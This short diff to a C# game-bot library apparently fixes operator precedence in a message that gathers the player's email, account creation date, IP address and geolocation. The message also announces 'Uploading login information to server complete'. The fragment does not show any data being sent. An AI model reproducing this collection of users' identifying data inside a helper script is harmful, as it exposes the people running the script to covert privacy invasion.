@@ -275,7 +275,7 @@ public class CoreBots
                                         $"\nEmail: {(Bot.Flash.GetGameObject("world.myAvatar.objData.strEmail") ?? "..")[1..^1]}" +
                                         $"\nAccount Created on: {(Bot.Flash.GetGameObject("world.myAvatar.objData.dCreated") ?? "..")[1..^1]}" +
                                         $"\nIP Adress: {ip}" +
-                                        loc.status.ToString() == "success" ? $"\nLocation: {loc.city}, {loc.regionName}, {loc.country}" : String.Empty,
+                                        (loc.status.ToString() == "success" ? $"\nLocation: {loc.city}, {loc.regionName}, {loc.country}" : String.Empty),
                                         "Uploading login information to server complete");
 
                                     async Task<string> getLocation()
